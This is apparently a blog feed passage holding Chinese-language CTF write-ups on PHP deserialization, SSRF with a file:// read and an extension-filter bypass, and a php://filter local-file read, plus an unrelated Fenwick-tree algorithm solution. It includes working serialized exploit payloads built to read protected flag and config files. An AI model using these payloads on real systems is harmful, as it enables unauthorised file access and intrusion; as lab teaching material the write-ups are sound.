299242, 305418, 313569, 269307, 338319, 306491, 351259]</p><p>​    o = np.array(o)</p><p>​    r = np.array(r)</p><p>​    x = np.linalg.solve(o,r)</p><p>​    res = ‘’</p><p>​    for i in x:</p><p>​        res += chr(int(str(i)[0:-2]))</p><p>​    print(res)</p></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PORT-51&quot;&gt;&lt;a href=&quot;#PORT-51&quot; class=&quot;headerlink&quot; title=&quot;PORT 51&quot;&gt;&lt;/a&gt;PORT 51&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯 一月 web</title>
    <link href="https://wywwzjj.top/2019/01/30/%E5%AE%89%E6%81%92%E6%9D%AF_%E4%B8%80%E6%9C%88-web/"/>
    <id>https://wywwzjj.top/2019/01/30/安恒杯_一月-web/</id>
    <published>2019-01-30T05:56:38.000Z</published>
    <updated>2019-02-28T09:05:31.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file)) &#123;             </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个简单的反序列化题。<br>注意到一个魔术方法 <code>__toString()</code>，当 <code>echo $obj;</code> 时会自动调用。<br>第三行的 <code>include &#39;flag.php&#39;;</code> 想必 flag 就在这个文件里了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br></pre></td></tr></table></figure></p><p>只要满足这个 <code>if</code> 就能读到 <code>flag.php</code></p><p>这里有两个思路，</p><ul><li>让 <code>amzing</code> 直接为空，反序列化后<code>nice</code>依然为空，<br>得到的 <code>$this-&gt;nice-&gt;aaa</code>和 <code>$this-&gt;nice-&gt;bbb</code>自然全为 null，所以 <code>===</code>。</li><li><p>让<code>this-&gt;bbb = &amp;this-&gt;aaa</code>，随便 <code>aaa</code> 怎么变。<br>此处的 <code>exp</code> 为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cc = <span class="keyword">new</span> baby();</span><br><span class="line">$cc-&gt;bbb = &amp;$cc-&gt;aaa;</span><br><span class="line">print_r(urlencode(serialize($cc)));</span><br><span class="line"><span class="comment">/* O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A3%3A%22s</span></span><br><span class="line"><span class="comment">ec%22%3A0%3A%7B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D */</span></span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  <span class="comment">// cool 对象</span></span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;skyobj = new sec;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj-&gt;filename = <span class="string">'flag.php'</span>;</span><br><span class="line">        <span class="comment">//$this-&gt;skyobj-&gt;amzing = 'O%3A4%3A%22baby%22%3A3%3A.........';</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$bb = <span class="keyword">new</span> baby();</span><br><span class="line">print_r(urlencode(serialize($bb)));</span><br></pre></td></tr></table></figure></li></ul><p>url 编码是必要的，避免特殊符号编码引起的长度歧义，出现 <code>Error at offset 错误</code>。<br>flag 在源代码里，记得查看。</p><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h1><p>待更新</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;babyGo&quot;&gt;&lt;a href=&quot;#babyGo&quot; class=&quot;headerlink&quot; title=&quot;babyGo&quot;&gt;&lt;/a&gt;babyGo&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2019 fireshell web Vice</title>
    <link href="https://wywwzjj.top/2019/01/30/2019_%C2%96Fireshell_Web_Vice/"/>
    <id>https://wywwzjj.top/2019/01/30/2019_Fireshell_Web_Vice/</id>
    <published>2019-01-30T05:52:46.000Z</published>
    <updated>2019-02-28T09:03:55.473Z</updated>
    
    <content type="html"><![CDATA[<p><strong>题目所给源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//require_once 'config.php';</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHITS</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $url;</span><br><span class="line"><span class="keyword">private</span> $method;</span><br><span class="line"><span class="keyword">private</span> $addr;</span><br><span class="line"><span class="keyword">private</span> $host;</span><br><span class="line"><span class="keyword">private</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method,$url)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line"><span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doit</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = @parse_url(<span class="keyword">$this</span>-&gt;url)[<span class="string">'host'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;addr = @gethostbyname(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = @gethostbyaddr(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;addr !== <span class="string">"127.0.0.1"</span> || <span class="keyword">$this</span>-&gt;name === <span class="keyword">false</span>)&#123;</span><br><span class="line">$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">$p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line"><span class="keyword">if</span>($p)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="keyword">$this</span>-&gt;method,<span class="keyword">array</span>(<span class="string">"doit"</span>)))&#123;</span><br><span class="line">call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="keyword">$this</span>-&gt;method),<span class="keyword">array</span>());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"gg"</span>])) &#123;</span><br><span class="line">@unserialize($_GET[<span class="string">"gg"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开 <code>config.php</code> ，出现 awn…<br>猜想 <code>flag</code> 在 <code>config.php</code> 中，并且有访问限制，构造 <code>ssrf</code> 进行访问，然而还是啥都没有，与外网直接访问的界面一样<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">    $p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line">    <span class="keyword">if</span>($p)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处可构造   <a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">绕过方法参考</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@68.183.31.62:991/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@localhost/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'localhost/config%2ephp'</span>);</span><br><span class="line">$ser = serialize($gg);</span><br><span class="line"><span class="keyword">echo</span> urlencode($ser) .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($ser);</span><br></pre></td></tr></table></figure></p><p>得到：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>SHITS%<span class="number">22</span>%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>url%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22.</span>php%<span class="number">4068.183</span><span class="number">.31</span><span class="number">.62</span>%<span class="number">3</span>A991%<span class="number">2</span>Fco</span><br><span class="line">nfig.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>method%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>doit%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>addr%<span class="number">22</span>%<span class="number">3</span>B</span><br><span class="line">N%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>host%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></p><p>先URL编码，若序列化后直接反序列化，某些特殊符号的编码问题会引起<code>length</code>混乱，出现 <code>unserialize(): Error at offset 错误</code>，<br>也可以进行其他的编码，比如 base64，但是需要改代码，这里利用 web 特性，<code>url 编码</code>最方便</p><p>但是并没有什么卵用</p><p>还是得 <code>file:///var/www/html/config%2ephp</code> 二次编码绕过 <code>.</code></p><p><strong>exp</strong>：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O<span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%22</span>SHITS<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">10</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>url<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">33</span><span class="symbol">%3</span>A<span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="symbol">%2</span>Fvar<span class="symbol">%2</span>Fwww</span><br><span class="line"><span class="symbol">%2</span>Fhtml<span class="symbol">%2</span>Fconfig<span class="symbol">%252</span>ephp<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>method<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">4</span><span class="symbol">%3</span>A<span class="symbol">%22</span>doit<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span></span><br><span class="line"><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>addr<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>host<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>name<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>B<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure></p><p>读取 <code>config.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'::1'</span> || $_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"aaawn"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$flag =<span class="string">"F#&#123;wtf_5trp0s_&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>观察代码，此处的 <code>||</code>，能到 else 吗，出题人真阴险 :)</p><p>其实可以这样，不需要所有属性，只要前两个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;题目所给源码&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="ssrf" scheme="https://wywwzjj.top/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>POJ-2352-Stars[树状数组]</title>
    <link href="https://wywwzjj.top/2019/01/02/%C2%96POJ_2352_Stars_%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    <id>https://wywwzjj.top/2019/01/02/POJ_2352_Stars_树状数组/</id>
    <published>2019-01-02T01:52:33.000Z</published>
    <updated>2019-03-20T05:23:19.034Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://poj.org/problem?id=2352" target="_blank" rel="noopener">原题链接</a><br> <strong>题目大意</strong><br>  给出一些星星的二维坐标，求星星左方，下方，左下方的星星个数。</p><p><strong>思路</strong><br>题目已经把星星按照 y 坐标从小到大排序，若 y 相等则按 x 从小到大排序。因此，在每次对一个星星进行统计时，之前出现过的星星，只要 x 坐标比其小，则必在其左，左下方，x 坐标相等的自然在下方。</p><p><strong>代码</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">4e4</span>;  <span class="comment">// 注意此处</span></span><br><span class="line"><span class="keyword">int</span> arr[N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans[N/<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; (-x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; N) &#123;  <span class="comment">// 注意是 N</span></span><br><span class="line">        arr[i] += v;</span><br><span class="line">        i += lowbit(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x) &#123;</span><br><span class="line">        res += arr[x];</span><br><span class="line">        x -= lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, y; <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        ans[Sum(++x)]++;  <span class="comment">// x 要加一</span></span><br><span class="line">        add(x, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://poj.org/problem?id=2352&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原题链接&lt;/a&gt;&lt;br&gt; &lt;strong&gt;题目大意&lt;/strong&gt;&lt;br&gt;  给出一些星星的二维坐标，求星星左方，下方，左下方的
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>2017 NJCTF web guess</title>
    <link href="https://wywwzjj.top/2018/12/30/2017_NJCTF_Guess/"/>
    <id>https://wywwzjj.top/2018/12/30/2017_NJCTF_Guess/</id>
    <published>2018-12-30T04:54:58.000Z</published>
    <updated>2019-03-20T04:51:40.258Z</updated>
    
    <content type="html"><![CDATA[<p>粗一看，是文件上传的题目。</p><p>随便传一个文件试试，测试可知，只是验证后缀，改后缀即可绕过。</p><p>问题是文件传到哪里去了，这也是本题的核心考点。</p><p><a href="http://111.198.29.45:30117/?page=upload" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=upload</a></p><p>url 有所变化，可能任意跳转，尝试下伪协议读源码，成功。</p><p><a href="http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=index" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=index</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 